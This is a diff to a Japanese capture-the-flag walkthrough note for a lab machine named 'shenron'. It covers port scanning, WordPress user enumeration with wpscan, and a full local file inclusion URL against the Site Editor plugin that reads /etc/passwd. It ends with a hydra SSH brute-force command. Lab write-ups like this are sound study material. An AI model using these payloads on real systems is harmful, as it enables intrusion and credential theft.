@@ -8,6 +8,8 @@
 ## 攻略
 - nmap
   - 22,80,8080
+- webサイトを見る
+  - サイトが崩れているのでinspectを見ると、shenronドメインに接続しようとしているが失敗しているので`/etc/hosts`を書き換える 
 - `nmap -scrip=http-wordpress-users.nse $IP`
   - ユーザ名はadminとわかる 
 - wpscanする
@@ -15,10 +17,11 @@
   - `wpscan --url http://shenron:8080 -e ap`
 - 見つかった脆弱性を検索する
   - 検索で`exploitdb wordpress plugin site editor local file inclusion`
-  - exploitdbのサイトをGeminiかなんかで翻訳して何が書いてあるか理解して,`Proof of Concept`と書いてある下にリンクあるのでパスをコピーする
+  - exploitdbのサイトをGeminiかなんかで翻訳して何が書いてあるか理解して,`** Proof of Concept **`と書いてある下にリンクあるのでパスをコピーする
 - LFI
   - ブラウザに次の貼り付ける
-  - `http://~:8080/wp-content/plugins/site-editor/~=/etc/passwd` コピーをペーストする     
+  - `http://shenron:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+` コピーをペーストする     
   - ユーザはroot,jenny,shenron
 - `hydra -l jenny -e nsr ssh://$IP`
   - nはnull,sはログインとパスワードが同じ,rはユーザ名を逆にしたもの
